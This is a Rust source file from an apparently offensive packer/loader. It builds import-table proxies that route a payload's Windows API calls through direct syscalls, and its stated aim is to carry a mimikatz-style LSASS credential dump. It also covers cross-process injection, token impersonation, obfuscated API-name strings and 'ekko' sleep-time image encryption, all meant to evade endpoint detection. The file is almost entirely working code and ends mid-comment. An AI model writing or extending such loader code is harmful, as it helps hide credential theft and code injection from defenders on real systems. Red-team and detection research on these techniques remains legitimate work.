//! API-resolution configuration and the proxy catalogue.
//!
//! `build.stub.api_resolution` (YAML) tells the loader to resolve the payload's
//! Windows API calls through a proxy generated in the stub instead of letting the
//! payload reach the real export. It is a *loader* concern, like
//! `build.stub.syscalls`, not a pipeline technique: it changes how the loader
//! resolves the payload's imports before running it.
//!
//! This module owns the **catalogue**: the closed, code-defined list of APIs an
//! operator may select. Adding an entry is a deliberate code change, because each
//! entry needs an implementation (how its proxy forwards or routes the call),
//! which is why the selection is validated against the catalogue instead of being
//! accepted as free-form text.
//!
//! `mode: proxy` rewrites the payload's IAT so catalogue hits land on the
//! generated proxies; every other import is forwarded, or refused when
//! `unmatched: abort`. The catalogue docs, phases and limitations live in
//! `docs/design/api-resolution.md`.

use serde::{Deserialize, Serialize};

use super::syscalls;
use crate::engine::obfuscation::StringsConfig;
use crate::error::{PackerError, Result};

/// Raw `build.stub.api_resolution` YAML block, before semantic validation.
///
/// `mode` and `unmatched` are plain strings here so
/// [`ApiResolutionConfig::from_yaml`] can report clear errors for invalid values
/// instead of a generic deserialization message, matching `YamlSyscallsPlan`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct YamlApiResolutionPlan {
    /// Proxy mode (`none` or `proxy`).
    #[serde(default = "default_mode")]
    pub mode: String,

    /// Catalogue selections, written as `dll!function` (e.g.
    /// `kernel32!ReadProcessMemory`), a list of them, or `all` to proxy every
    /// catalogue entry. The module side is normalized on lookup.
    #[serde(
        default,
        skip_serializing_if = "Vec::is_empty",
        deserialize_with = "deserialize_apis"
    )]
    pub apis: Vec<String>,

    /// What to do with imports not in the catalogue (`forward` or `abort`).
    #[serde(default = "default_unmatched")]
    pub unmatched: String,

    /// Per-API behavior for intercepted calls that is not a plain route.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub hooks: Option<YamlHooks>,
}

/// `build.stub.api_resolution.hooks`: interception behavior that needs its own
/// parameters (the IAT seam is the same; the action is not a route).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(deny_unknown_fields)]
pub struct YamlHooks {
    /// Obfuscate the payload's mapped image while it sleeps.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sleep: Option<YamlSleepHook>,
}

/// `hooks.sleep`: the `Sleep` proxy runs ekko over the mapped payload.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct YamlSleepHook {
    /// Obfuscation variant. Only `ekko` is implemented.
    #[serde(default = "default_obfuscate")]
    pub obfuscate: String,

    /// Sleeps shorter than this are a plain delay: a payload that yields with
    /// `Sleep(0)` or polls with short sleeps must not pay the ROP chain.
    #[serde(default = "default_min_ms")]
    pub min_ms: u64,

    /// Sleeps longer than this are a plain delay: the image stays encrypted
    /// only for a bounded window.
    #[serde(default = "default_max_ms")]
    pub max_ms: u64,

    /// Acknowledges that the payload does not execute from the mapped image on
    /// another thread while it sleeps. Ekko cannot encrypt a region that is
    /// still running; a multi-threaded payload would crash.
    #[serde(default)]
    pub assume_single_threaded: bool,
}

fn default_obfuscate() -> String {
    "ekko".to_string()
}

fn default_min_ms() -> u64 {
    1000
}

fn default_max_ms() -> u64 {
    600_000
}

fn default_mode() -> String {
    "none".to_string()
}

fn default_unmatched() -> String {
    "forward".to_string()
}

/// Deserializes `apis` from a bare string (`apis: all`) or a list of strings.
fn deserialize_apis<'de, D>(deserializer: D) -> std::result::Result<Vec<String>, D::Error>
where
    D: serde::Deserializer<'de>,
{
    struct ApisVisitor;

    impl<'de> serde::de::Visitor<'de> for ApisVisitor {
        type Value = Vec<String>;

        fn expecting(&self, formatter: &mut core::fmt::Formatter) -> core::fmt::Result {
            formatter.write_str("a selector string or a list of selector strings")
        }

        fn visit_str<E>(self, value: &str) -> std::result::Result<Self::Value, E>
        where
            E: serde::de::Error,
        {
            Ok(vec![value.to_string()])
        }

        fn visit_seq<A>(self, seq: A) -> std::result::Result<Self::Value, A::Error>
        where
            A: serde::de::SeqAccess<'de>,
        {
            Vec::<String>::deserialize(serde::de::value::SeqAccessDeserializer::new(seq))
        }
    }

    deserializer.deserialize_any(ApisVisitor)
}

/// Whether the loader proxies the payload's API resolution at all.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ApiResolutionMode {
    /// The loader resolves imports as before; the block is a no-op.
    None,
    /// Catalogue hits are served by a proxy generated in the stub.
    Proxy,
}

/// What the loader does with an import that is *not* in the catalogue.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Unmatched {
    /// Resolve it normally (no proxy).
    Forward,
    /// Abort the load.
    Abort,
}

/// What a generated proxy does with an intercepted call.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Strategy {
    /// Call the original function (resolved dynamically, never imported).
    ///
    /// No shipped catalogue entry uses it today (see
    /// `docs/design/api-resolution.md`): it stays available for "thick" APIs
    /// that cannot be re-implemented on a syscall.
    #[allow(dead_code)]
    Forward,
    /// Re-implement the call on the native `Nt*` function via the syscall layer.
    RouteToNt,
    /// A handler that decides what to return (the `GetProcAddress` case).
    Handler,
}

/// One selectable API in the catalogue.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct ApiEntry {
    /// Normalized module base name: lowercase, no `.dll` (e.g. `kernel32`).
    pub dll: &'static str,
    /// Export name (case-sensitive).
    pub func: &'static str,
    /// What the generated proxy does.
    pub strategy: Strategy,
    /// The `Nt*` function the proxy routes to (`RouteToNt` only).
    pub nt: Option<&'static str>,
}

impl ApiEntry {
    /// The `dll!func` selector used in the YAML.
    pub fn selector(&self) -> String {
        let (dll, func) = (self.dll, self.func);
        format!("{dll}!{func}")
    }
}

/// The catalogue of APIs an operator may select.
///
/// Minimal on purpose (see `docs/design/api-resolution.md`): the critical path of
/// a mimikatz-style payload to LSASS. `NtReadVirtualMemory` already exists in the
/// syscall layer; `NtOpenProcess` is added alongside it.
pub const CATALOGUE: &[ApiEntry] = &[
    ApiEntry {
        dll: "ntdll",
        func: "NtReadVirtualMemory",
        strategy: Strategy::RouteToNt,
        nt: Some("NtReadVirtualMemory"),
    },
    ApiEntry {
        dll: "ntdll",
        func: "NtOpenProcess",
        strategy: Strategy::RouteToNt,
        nt: Some("NtOpenProcess"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "ReadProcessMemory",
        strategy: Strategy::RouteToNt,
        nt: Some("NtReadVirtualMemory"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "OpenProcess",
        strategy: Strategy::RouteToNt,
        nt: Some("NtOpenProcess"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "GetProcAddress",
        strategy: Strategy::Handler,
        nt: None,
    },
    // Cross-process injection: the Win32 wrappers re-implemented on the native
    // calls the syscall layer already carries.
    ApiEntry {
        dll: "kernel32",
        func: "VirtualAllocEx",
        strategy: Strategy::RouteToNt,
        nt: Some("NtAllocateVirtualMemory"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "WriteProcessMemory",
        strategy: Strategy::RouteToNt,
        nt: Some("NtWriteVirtualMemory"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "VirtualProtectEx",
        strategy: Strategy::RouteToNt,
        nt: Some("NtProtectVirtualMemory"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "CreateRemoteThread",
        strategy: Strategy::RouteToNt,
        nt: Some("NtCreateThreadEx"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "QueueUserAPC",
        strategy: Strategy::RouteToNt,
        nt: Some("NtQueueApcThread"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "ResumeThread",
        strategy: Strategy::RouteToNt,
        nt: Some("NtResumeThread"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "SuspendThread",
        strategy: Strategy::RouteToNt,
        nt: Some("NtSuspendThread"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "GetThreadContext",
        strategy: Strategy::RouteToNt,
        nt: Some("NtGetContextThread"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "SetThreadContext",
        strategy: Strategy::RouteToNt,
        nt: Some("NtSetContextThread"),
    },
    // Token manipulation. `LogonUser` is deliberately absent: it is a
    // LSA/ALPC interaction with no single Nt* equivalent.
    ApiEntry {
        dll: "advapi32",
        func: "OpenProcessToken",
        strategy: Strategy::RouteToNt,
        nt: Some("NtOpenProcessToken"),
    },
    ApiEntry {
        dll: "advapi32",
        func: "DuplicateTokenEx",
        strategy: Strategy::RouteToNt,
        nt: Some("NtDuplicateToken"),
    },
    ApiEntry {
        dll: "advapi32",
        func: "ImpersonateLoggedOnUser",
        strategy: Strategy::RouteToNt,
        nt: Some("NtSetInformationThread"),
    },
    // Process-memory primitives. These are `Handler` entries: the Win32
    // signatures take the current process implicitly, so the wrapper rebuilds
    // the call on the native helper instead of forwarding it.
    ApiEntry {
        dll: "kernel32",
        func: "VirtualAlloc",
        strategy: Strategy::Handler,
        nt: Some("NtAllocateVirtualMemory"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "VirtualProtect",
        strategy: Strategy::Handler,
        nt: Some("NtProtectVirtualMemory"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "VirtualFree",
        strategy: Strategy::Handler,
        nt: Some("NtFreeVirtualMemory"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "CloseHandle",
        strategy: Strategy::Handler,
        nt: Some("NtClose"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "WaitForSingleObject",
        strategy: Strategy::Handler,
        nt: Some("NtWaitForSingleObject"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "VirtualQuery",
        strategy: Strategy::Handler,
        nt: Some("NtQueryVirtualMemory"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "CreateThread",
        strategy: Strategy::Handler,
        nt: Some("NtCreateThreadEx"),
    },
    ApiEntry {
        dll: "advapi32",
        func: "OpenThreadToken",
        strategy: Strategy::Handler,
        nt: Some("NtOpenThreadToken"),
    },
];

/// Additional `Nt*` helpers a handler calls beyond [`ApiEntry::nt`].
///
/// Kept as a table so the catalogue literals stay one-helper-per-entry: the
/// `CreateThread` wrapper also queries `ThreadBasicInformation` to fill
/// `lpThreadId`, which the native create call does not return.
const EXTRA_SYSCALLS: &[(&str, &str, &str)] =
    &[("kernel32", "CreateThread", "NtQueryInformationThread")];

/// Resolved `build.stub.api_resolution` configuration.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ApiResolutionConfig {
    /// Whether the loader proxies API resolution at all.
    pub mode: ApiResolutionMode,
    /// Selected entries, in first-seen order and deduplicated.
    pub apis: Vec<ApiEntry>,
    /// What to do with imports not in the catalogue.
    pub unmatched: Unmatched,
    /// Interception behavior that is not a plain route.
    pub hooks: HooksConfig,
}

/// Resolved `hooks:` block.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct HooksConfig {
    /// Obfuscate the payload while it sleeps, or `None`.
    pub sleep: Option<SleepHookConfig>,
}

/// Resolved `hooks.sleep`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SleepHookConfig {
    /// Shortest sleep that is obfuscated, in milliseconds.
    pub min_ms: u32,
    /// Longest sleep that is obfuscated, in milliseconds.
    pub max_ms: u32,
}

impl HooksConfig {
    /// Resolves and validates the hook block.
    ///
    /// `assume_single_threaded` is a hard requirement in this phase: the chain
    /// encrypts the mapped image, so a payload thread executing from it would
    /// fault. The field forces the operator to acknowledge that constraint
    /// instead of discovering it in the lab.
    fn from_yaml(yaml: &YamlHooks) -> Result<Self> {
        let sleep = match &yaml.sleep {
            Some(sleep) => {
                if sleep.obfuscate != "ekko" {
                    return Err(PackerError::Validation(format!(
                        "invalid build.stub.api_resolution.hooks.sleep.obfuscate '{}': expected \
                         'ekko' (foliage and cronos are not implemented)",
                        sleep.obfuscate
                    )));
                }
                if sleep.min_ms > sleep.max_ms {
                    return Err(PackerError::Validation(format!(
                        "build.stub.api_resolution.hooks.sleep.min_ms ({}) is greater than max_ms \
                         ({})",
                        sleep.min_ms, sleep.max_ms
                    )));
                }
                if sleep.max_ms > u32::MAX as u64 {
                    return Err(PackerError::Validation(format!(
                        "build.stub.api_resolution.hooks.sleep.max_ms ({}) exceeds the maximum of \
                         {}",
                        sleep.max_ms,
                        u32::MAX
                    )));
                }
                if !sleep.assume_single_threaded {
                    return Err(PackerError::Validation(
                        "build.stub.api_resolution.hooks.sleep encrypts the mapped payload image \
                         while it sleeps, so no other payload thread may execute from it: set \
                         'assume_single_threaded: true' to acknowledge that constraint"
                            .to_string(),
                    ));
                }
                Some(SleepHookConfig {
                    min_ms: sleep.min_ms as u32,
                    max_ms: sleep.max_ms as u32,
                })
            }
            None => None,
        };
        Ok(Self { sleep })
    }
}

impl Default for ApiResolutionConfig {
    fn default() -> Self {
        Self {
            mode: ApiResolutionMode::None,
            apis: Vec::new(),
            unmatched: Unmatched::Forward,
            hooks: HooksConfig::default(),
        }
    }
}

impl ApiResolutionConfig {
    /// Resolves the configuration from the (optional) YAML block.
    ///
    /// `None` means the defaults (`mode: none`, `unmatched: forward`, no APIs).
    /// An unknown mode/unmatched value, a malformed selector, or a name that is
    /// not in the catalogue is a validation error with a clear message.
    pub fn from_yaml(yaml: Option<&YamlApiResolutionPlan>) -> Result<Self> {
        let Some(yaml) = yaml else {
            return Ok(Self::default());
        };

        let mode = match yaml.mode.as_str() {
            "none" => ApiResolutionMode::None,
            "proxy" => ApiResolutionMode::Proxy,
            other => {
                return Err(PackerError::Validation(format!(
                    "invalid build.stub.api_resolution.mode '{other}': expected 'none' or 'proxy'"
                )));
            }
        };

        let unmatched = match yaml.unmatched.as_str() {
            "forward" => Unmatched::Forward,
            "abort" => Unmatched::Abort,
            other => {
                return Err(PackerError::Validation(format!(
                    "invalid build.stub.api_resolution.unmatched '{other}': expected 'forward' or \
                     'abort'"
                )));
            }
        };

        // Every selectable entry: the catalogue plus a direct `ntdll!Nt*` route
        // for each syscall-layer function whose helper can back a faithful proxy.
        let direct = direct_entries();
        let selectable: Vec<ApiEntry> = {
            let mut all: Vec<ApiEntry> = CATALOGUE.to_vec();
            for entry in &direct {
                if !all.contains(entry) {
                    all.push(*entry);
                }
            }
            all
        };

        // `all` proxies every selectable entry; `ntdll:*` the direct routes;
        // otherwise each `dll!function` selector is looked up (an unknown name is
        // a validation error).
        let mut apis: Vec<ApiEntry> = Vec::new();
        if yaml
            .apis
            .iter()
            .any(|selector| selector.eq_ignore_ascii_case("all"))
        {
            apis = selectable;
        } else {
            for selector in &yaml.apis {
                if selector.eq_ignore_ascii_case("ntdll:*") {
                    for entry in &direct {
                        push_unique(&mut apis, *entry);
                    }
                } else {
                    let entry =
                        lookup(selector, &selectable).ok_or_else(|| unknown_api(selector))?;
                    push_unique(&mut apis, entry);
                }
            }
        }

        let config = Self {
            mode,
            apis,
            unmatched,
            hooks: match &yaml.hooks {
                Some(hooks) => HooksConfig::from_yaml(hooks)?,
                None => HooksConfig::default(),
            },
        };
        if config.hooks.sleep.is_some() && config.mode != ApiResolutionMode::Proxy {
            return Err(PackerError::Validation(
                "build.stub.api_resolution.hooks requires 'mode: proxy': a hook replaces the \
                 payload's import slot with a generated proxy"
                    .to_string(),
            ));
        }
        Ok(config)
    }

    /// Whether the configuration does nothing at build time.
    ///
    /// True when the mode is `none`, or when `proxy` declares neither an API to
    /// intercept nor a hook.
    pub fn is_noop(&self) -> bool {
        self.mode == ApiResolutionMode::None || (self.apis.is_empty() && self.hooks.sleep.is_none())
    }
}

/// The direct `ntdll!Nt*` routes a generated proxy can serve.
fn direct_entries() -> Vec<ApiEntry> {
    syscalls::nt_proxy_names()
        .into_iter()
        .map(|name| ApiEntry {
            dll: "ntdll",
            func: name,
            strategy: Strategy::RouteToNt,
            nt: Some(name),
        })
        .collect()
}

/// Pushes `entry` unless an equal one is already present.
fn push_unique(apis: &mut Vec<ApiEntry>, entry: ApiEntry) {
    if !apis.contains(&entry) {
        apis.push(entry);
    }
}

/// Looks up a `dll!func` selector (module side normalized) among `selectable`.
fn lookup(selector: &str, selectable: &[ApiEntry]) -> Option<ApiEntry> {
    let (dll, func) = selector.split_once('!')?;
    let dll = normalize_module(dll);
    selectable
        .iter()
        .find(|entry| entry.dll == dll.as_str() && entry.func == func)
        .copied()
}

/// Normalizes a module name for comparison: file-name component only, a trailing
/// `.dll` stripped (case-insensitively), ASCII-lowercased.
///
/// The resolver and the generated `GetProcAddress` handler normalize both sides
/// the same way, so `kernel32`, `KERNEL32.DLL` and a full path all match.
fn normalize_module(name: &str) -> String {
    let base = name.rsplit(['\\', '/']).next().unwrap_or(name);
    let lower = base.to_ascii_lowercase();
    lower.strip_suffix(".dll").unwrap_or(&lower).to_string()
}

/// The error for a selector that is not in the catalogue.
fn unknown_api(selector: &str) -> PackerError {
    let known = CATALOGUE
        .iter()
        .map(ApiEntry::selector)
        .collect::<Vec<_>>()
        .join(", ");
    PackerError::Validation(format!(
        "unknown build.stub.api_resolution.apis entry '{selector}': not in the catalogue ({known}); \
         use 'ntdll:*' for every direct Nt* route or 'all' for everything"
    ))
}

/// The `Nt*` functions the selected proxies route to.
impl ApiResolutionConfig {
    /// The `Nt*` helpers the syscall layer must provide for the selected
    /// entries, deduplicated and in the catalogue order.
    ///
    /// Both a direct route and a handler declare the helper it ends up calling:
    /// a `RouteToNt` entry forwards to it, and a `Handler` (the Win32 wrappers)
    /// calls it from its body.
    pub fn required_syscalls(&self) -> Vec<&'static str> {
        let mut out: Vec<&'static str> = Vec::new();
        for entry in &self.apis {
            if let Some(nt) = entry.nt {
                if !out.contains(&nt) {
                    out.push(nt);
                }
            }
            for (dll, func, extra) in EXTRA_SYSCALLS {
                if entry.dll == *dll && entry.func == *func && !out.contains(extra) {
                    out.push(extra);
                }
            }
        }
        // The `Sleep` hook degrades to a real delay on every path it does not
        // obfuscate, and that delay is `NtDelayExecution`.
        if self.hooks.sleep.is_some() && !out.contains(&"NtDelayExecution") {
            out.push("NtDelayExecution");
        }
        out
    }
}

/// Renders the `$API_RESOLUTION_BLOCK$` fragment for the given configuration.
///
/// Emits a no-op `resolution_policy` when nothing is proxied (the execution
/// fragment always calls it), or the selected proxies plus the policy that maps
/// each intercepted `(module, function)` to its proxy. Imports outside the
/// catalogue resolve normally, or fail the load when `unmatched: abort`. Every
/// API name is rebuilt at runtime from `strings`; the names appear only in
/// comments (stripped from the source-literal guard) and in `proxy_<index>`
/// identifiers.
pub fn render_block(config: &ApiResolutionConfig, strings: &StringsConfig) -> String {
    if config.mode != ApiResolutionMode::Proxy
        || (config.apis.is_empty() && config.hooks.sleep.is_none())
    {
        return NOOP_BLOCK.to_string();
    }

    let mut proxies = String::new();
    let mut matches = String::new();

    for (index, entry) in config.apis.iter().enumerate() {
        proxies.push_str(&proxy_body(index, entry, strings));
        proxies.push('\n');

        let module_def = strings
            .obfuscate(entry.dll)
            .render_stub_expr(&format!("intercept_{index}_module"));
        let function_def = strings
            .obfuscate(entry.func)
            .render_stub_expr(&format!("intercept_{index}_function"));
        matches.push_str(&format!(
            "        {{\n            let want_module: String = {module_def};\n            let want_function: String = \
             {function_def};\n            if module == want_module.as_str() && func == \
             want_function.as_str() {{\n                return crate::ImportPolicy::Proxy(proxy_{index} as usize as u64);\n            }}\n        \
             }}\n"
        ));
    }

    // A hook matches by function name only. API-set imports (`Sleep` commonly
    // arrives through `api-ms-win-core-synch-*`) name a virtual module, so a
    // module comparison would miss them; `Sleep` is unambiguous enough.
    if let Some(sleep) = &config.hooks.sleep {
        let index = config.apis.len();
        proxies.push_str(&sleep_hook_proxy(index, sleep));
        proxies.push('\n');
        let function_def = strings
            .obfuscate("Sleep")
            .render_stub_expr("hook_sleep_function");
        matches.push_str(&format!(
            "        {{\n            let want_function: String = {function_def};\n            if func == \
             want_function.as_str() {{\n                return crate::ImportPolicy::Proxy(proxy_{index} as usize as u64);\n            }}\n        \
             }}\n"
        ));
    }

    let miss = match config.unmatched {
        Unmatched::Forward => "crate::ImportPolicy::Forward",
        Unmatched::Abort => "crate::ImportPolicy::Abort",
    };

    BLOCK_TEMPLATE
        .replace("$POLICY_MATCHES$", matches.trim_end())
        .replace("$MISS_DECISION$", miss)
        .replace("$PROXIES$", proxies.trim_end())
}

/// Index-based proxy id. The API name is kept only in comments so nothing but
/// obfuscated bytes carries it into the source or the binary.
fn proxy_id(index: usize) -> String {
    format!("proxy_{index}")
}

/// The `Sleep` hook body: conceals the mapped payload for the duration of the
/// sleep, and degrades to a real delay whenever it must not or cannot.
fn sleep_hook_proxy(index: usize, hook: &SleepHookConfig) -> String {
    let id = proxy_id(index);
    let comment = "hook for kernel32!Sleep: ekko over the mapped payload";
    SLEEP_HOOK
        .replace("$ID$", &id)
        .replace("$COMMENT$", comment)
        .replace("$MIN_MS$", &hook.min_ms.to_string())
        .replace("$MAX_MS$", &hook.max_ms.to_string())
}

/// The body of the proxy for one selected entry.
fn proxy_body(index: usize, entry: &ApiEntry, strings: &StringsConfig) -> String {
    // A direct `ntdll!Nt*` route is generated from the syscall layer's metadata.
    if entry.strategy == Strategy::RouteToNt {
        if let Some(info) = syscalls::nt_proxy_info(entry.func) {
            return direct_nt_proxy(index, entry, info);
        }
    }

    let id = proxy_id(index);
    let comment = format!("proxy for {}!{}", entry.dll, entry.func);
    match entry.func {
        "ReadProcessMemory" => WRAPPER_READ_PROCESS_MEMORY
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "OpenProcess" => REBUILD_OPEN_PROCESS
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "GetProcAddress" => handler_proxy(index, entry, strings),
        "VirtualAllocEx" => WRAPPER_VIRTUAL_ALLOC_EX
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "WriteProcessMemory" => WRAPPER_WRITE_PROCESS_MEMORY
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "VirtualProtectEx" => WRAPPER_VIRTUAL_PROTECT_EX
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "CreateRemoteThread" => REBUILD_CREATE_REMOTE_THREAD
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "QueueUserAPC" => WRAPPER_QUEUE_USER_APC
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "ResumeThread" => WRAPPER_RESUME_THREAD
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "SuspendThread" => WRAPPER_SUSPEND_THREAD
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "GetThreadContext" => WRAPPER_GET_THREAD_CONTEXT
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "SetThreadContext" => WRAPPER_SET_THREAD_CONTEXT
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "OpenProcessToken" => WRAPPER_OPEN_PROCESS_TOKEN
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "DuplicateTokenEx" => WRAPPER_DUPLICATE_TOKEN_EX
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "ImpersonateLoggedOnUser" => WRAPPER_IMPERSONATE_LOGGED_ON_USER
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "VirtualAlloc" => WRAPPER_VIRTUAL_ALLOC
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "VirtualProtect" => WRAPPER_VIRTUAL_PROTECT
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "VirtualFree" => WRAPPER_VIRTUAL_FREE
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "CloseHandle" => WRAPPER_CLOSE_HANDLE
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "WaitForSingleObject" => WRAPPER_WAIT_FOR_SINGLE_OBJECT
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "VirtualQuery" => WRAPPER_VIRTUAL_QUERY
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "CreateThread" => WRAPPER_CREATE_THREAD
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "OpenThreadToken" => WRAPPER_OPEN_THREAD_TOKEN
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        // Unreachable for the shipped catalogue; kept so an entry without a body
        // is visible in the generated source instead of referencing a missing
        // function.
        _ => format!("    // {comment}: no proxy body is implemented yet\n"),
    }
}

/// A generated direct `ntdll!Nt*` proxy: an `extern "system"` wrapper with the
/// export's native signature that forwards to the syscall-layer helper.
fn direct_nt_proxy(index: usize, entry: &ApiEntry, info: syscalls::NtProxyInfo) -> String {
    let id = proxy_id(index);
    let comment = format!("proxy for {}!{}", entry.dll, entry.func);
    let params = info
        .params
        .iter()
        .map(|(name, ty)| format!("{name}: {ty}"))
        .collect::<Vec<_>>()
        .join(", ");
    format!(
        "    /// {comment}: routed through the syscall layer.\n    \
         extern \"system\" fn {id}({params}) -> i32 {{\n        \
         crate::{helper}({forward})\n    }}\n",
        helper = info.helper_name,
        forward = info.forward,
    )
}

/// A `GetProcAddress` handler: catalogue hits get their proxy, everything else
/// (including ordinals) is forwarded to the original resolver.
fn handler_proxy(index: usize, entry: &ApiEntry, strings: &StringsConfig) -> String {
    let id = proxy_id(index);
    let comment = format!("handler for {}!{}", entry.dll, entry.func);
    let dll_def = strings
        .obfuscate(&format!("{}.dll", entry.dll))
        .render_stub_expr(&format!("original_{index}_dll"));
    let func_def = strings
        .obfuscate(entry.func)
        .render_stub_expr(&format!("original_{index}_func"));
    HANDLER_TEMPLATE
        .replace("$PROXY$", &id)
        .replace("$ORIGINAL$", &format!("original_{index}"))
        .replace("$COMMENT$", &comment)
        .replace("$DLL_DEF$", &dll_def)
        .replace("$FUNC_DEF$", &func_def)
}

/// A forwarding proxy: calls the original export, resolved at runtime.
#[allow(dead_code)]
fn forward_proxy(
    index: usize,
    entry: &ApiEntry,
    strings: &StringsConfig,
    params: &str,
    types: &str,
    ret: &str,
    args: &str,
) -> String {
    let id = proxy_id(index);
    let comment = format!("proxy for {}!{}", entry.dll, entry.func);
    let dll_def = strings
        .obfuscate(&format!("{}.dll", entry.dll))
        .render_stub_expr(&format!("original_{index}_dll"));
    let func_def = strings
        .obfuscate(entry.func)
        .render_stub_expr(&format!("original_{index}_func"));
    FORWARD_TEMPLATE
        .replace("$PROXY$", &id)
        .replace("$ORIGINAL$", &format!("original_{index}"))
        .replace("$COMMENT$", &comment)
        .replace("$PARAMS$", params)
        .replace("$TYPES$", types)
        .replace("$RET$", ret)
        .replace("$ARGS$", args)
        .replace("$DLL_DEF$", &dll_def)
        .replace("$FUNC_DEF$", &func_def)
}

const NOOP_BLOCK: &str = r#"// --- API resolution (build.stub.api_resolution) ---
// No API is proxied: the loader resolves the payload's imports normally.
mod api_resolution {
    /// Nothing is proxied in this build: every import is resolved normally.
    #[allow(dead_code)]
    pub fn resolution_policy(_dll: &str, _func: &str) -> crate::ImportPolicy {
        crate::ImportPolicy::Forward
    }
}
use api_resolution::resolution_policy;
"#;

const BLOCK_TEMPLATE: &str = r#"// --- API resolution (build.stub.api_resolution) ---
// The loader serves the selected APIs from a proxy generated here, so the
// intercepted calls leave the payload's IAT and (route_to_nt) reach the kernel
// through the syscall layer. The names are rebuilt at runtime from obfuscated
// bytes; only the comments carry them in clear.
mod api_resolution {
    /// Decides how one payload import slot is served: a generated proxy, the
    /// real export, or a refusal (`unmatched: abort`).
    #[allow(dead_code)]
    pub fn resolution_policy(dll: &str, func: &str) -> crate::ImportPolicy {
        let module = normalize_module(dll);
$POLICY_MATCHES$
        $MISS_DECISION$
    }

    /// Normalizes a module name for comparison: the file-name component, a
    /// trailing `.dll` stripped (case-insensitively), ASCII-lowercased.
    fn normalize_module(name: &str) -> String {
        let base = name.rsplit(['\\', '/']).next().unwrap_or(name);
        let lower = base.to_ascii_lowercase();
        lower.strip_suffix(".dll").unwrap_or(&lower).to_string()
    }

    /// `NtCurrentProcess()`: the `(HANDLE)-1` pseudo-handle.
    #[allow(dead_code)]
    fn current_process() -> windows::Win32::Foundation::HANDLE {
        windows::Win32::Foundation::HANDLE(-1isize as *mut core::ffi::c_void)
    }

    /// Publishes an NTSTATUS failure as the Win32 last error.
    #[allow(dead_code)]
    fn set_last_error(status: i32) {
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
    }

$PROXIES$
}
use api_resolution::resolution_policy;
"#;

const WRAPPER_READ_PROCESS_MEMORY: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtReadVirtualMemory
    /// (NTSTATUS -> BOOL, `GetLastError` preserved, partial count kept).
    extern "system" fn $ID$(
        process: windows::Win32::Foundation::HANDLE,
        base: *const core::ffi::c_void,
        buffer: *mut core::ffi::c_void,
        size: usize,
        read: *mut usize,
    ) -> i32 {
        let status = crate::nt_read_vm(process, base, buffer, size, read);
        if status >= 0 {
            return 1;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        0
    }
"#;

const REBUILD_OPEN_PROCESS: &str = r#"    /// $COMMENT$: rebuilt on NtOpenProcess (`OBJECT_ATTRIBUTES` + `CLIENT_ID`).
    ///
    /// The Win32 `PROCESS_*` access constants are the NT access masks, so
    /// `desired_access` is passed through unchanged; `inherit` maps to
    /// `OBJ_INHERIT`. Fidelity risk: `OpenProcess` documents `ERROR_INVALID_
    /// PARAMETER` for a zero access mask and `ERROR_ACCESS_DENIED` on refusal;
